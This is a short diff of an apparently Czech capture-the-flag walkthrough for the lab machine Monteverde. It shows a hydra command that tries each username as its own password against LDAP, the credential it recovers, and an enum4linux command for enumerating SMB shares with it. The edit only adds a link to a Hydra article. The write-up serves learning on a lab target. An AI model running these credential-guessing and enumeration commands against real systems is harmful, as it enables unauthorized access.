@@ -44,7 +44,7 @@ hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I
 => [389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: SABatchJobs
 ```
 
-S těmito údaji už jde systematicky procházet SMB sdílení a hledat cizí konfigurace nebo exporty.
+S těmito údaji už jde systematicky procházet SMB sdílení a hledat cizí konfigurace nebo exporty. Samotný krok `username = password` proti LDAP rozebírám samostatně i v článku [Hydra](/nastroje/hydra).
 ```bash
 ./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt
 ```
